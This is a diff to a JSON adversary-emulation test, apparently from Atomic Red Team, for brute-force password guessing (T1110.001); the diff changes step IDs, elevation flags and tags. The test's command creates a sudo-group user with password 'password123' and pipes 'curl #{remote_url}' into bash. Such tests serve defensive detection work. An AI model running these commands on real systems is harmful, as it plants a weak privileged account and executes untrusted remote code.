@@ -7,25 +7,25 @@
   ],
   "steps": [
     {
-      "id": "9a42e66f-a4d4-4035-b83a-e44e4e50908b",
+      "id": "0b4a36fe-8413-438a-99ec-e67997c260e7",
       "type": "execute-command",
       "data": {
         "command": "useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash\n",
         "command_type": "bash"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "ba8a4522-a826-4cca-94b4-ac75d831256b",
+      "id": "347a091d-4608-4109-b0ce-376f14a688be",
       "type": "execute-command",
       "data": {
         "command": "userdel -fr art\n",
         "command_type": "bash"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "4bf7abd5-b8b7-4e10-9e17-277a3b24b017",
+      "id": "61370281-6115-46cf-ab4f-4a48d4038f72",
       "name": "Check dependency 1/1",
       "description": "Check if running on a Debian based machine.\n",
       "type": "execute-command",
@@ -33,10 +33,10 @@
         "command": "if grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then echo \"Debian\"; else echo \"NOT Debian\"; exit 1; fi\nif grep -Rq \"pam_tally\" /etc/pam.d/*; then echo \"pam_tally configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "ef2a7690-c608-41bd-8df4-e0d8fed19dac",
+      "id": "60b2a6cb-cff8-4407-b265-53cd622ce1b5",
       "name": "Resolve dependency 1/1",
       "description": "Check if running on a Debian based machine.\n",
       "type": "execute-command",
@@ -44,10 +44,10 @@
         "command": "apt update \u0026\u0026 apt install -y openssl sudo curl\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "07e6aa92-7d5e-4152-945b-95007782956a",
+      "id": "eb50f781-1a47-428a-9a9e-0e9ffe4c4321",
       "name": "Re-check dependency 1/1",
       "description": "Check if running on a Debian based machine.\n",
       "type": "execute-command",
@@ -55,44 +55,44 @@
         "command": "if grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then echo \"Debian\"; else echo \"NOT Debian\"; exit 1; fi\nif grep -Rq \"pam_tally\" /etc/pam.d/*; then echo \"pam_tally configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "9a42e66f-a4d4-4035-b83a-e44e4e50908b",
+      "s": "0b4a36fe-8413-438a-99ec-e67997c260e7",
       "p": "on-success",
-      "o": "ba8a4522-a826-4cca-94b4-ac75d831256b"
+      "o": "347a091d-4608-4109-b0ce-376f14a688be"
     },
     {
-      "s": "9a42e66f-a4d4-4035-b83a-e44e4e50908b",
+      "s": "0b4a36fe-8413-438a-99ec-e67997c260e7",
       "p": "on-failure",
-      "o": "ba8a4522-a826-4cca-94b4-ac75d831256b"
+      "o": "347a091d-4608-4109-b0ce-376f14a688be"
     },
     {
-      "s": "4bf7abd5-b8b7-4e10-9e17-277a3b24b017",
+      "s": "61370281-6115-46cf-ab4f-4a48d4038f72",
       "p": "on-success",
-      "o": "9a42e66f-a4d4-4035-b83a-e44e4e50908b"
+      "o": "0b4a36fe-8413-438a-99ec-e67997c260e7"
     },
     {
-      "s": "4bf7abd5-b8b7-4e10-9e17-277a3b24b017",
+      "s": "61370281-6115-46cf-ab4f-4a48d4038f72",
       "p": "on-failure",
-      "o": "ef2a7690-c608-41bd-8df4-e0d8fed19dac"
+      "o": "60b2a6cb-cff8-4407-b265-53cd622ce1b5"
     },
     {
-      "s": "ef2a7690-c608-41bd-8df4-e0d8fed19dac",
+      "s": "60b2a6cb-cff8-4407-b265-53cd622ce1b5",
       "p": "on-success",
-      "o": "07e6aa92-7d5e-4152-945b-95007782956a"
+      "o": "eb50f781-1a47-428a-9a9e-0e9ffe4c4321"
     },
     {
-      "s": "07e6aa92-7d5e-4152-945b-95007782956a",
+      "s": "eb50f781-1a47-428a-9a9e-0e9ffe4c4321",
       "p": "on-failure",
-      "o": "9a42e66f-a4d4-4035-b83a-e44e4e50908b"
+      "o": "0b4a36fe-8413-438a-99ec-e67997c260e7"
     }
   ],
   "tags": [
-    "T1110.001",
-    "atomic-red-team"
+    "T1110",
+    "T1110.001"
   ],
   "input_arguments": [
     {
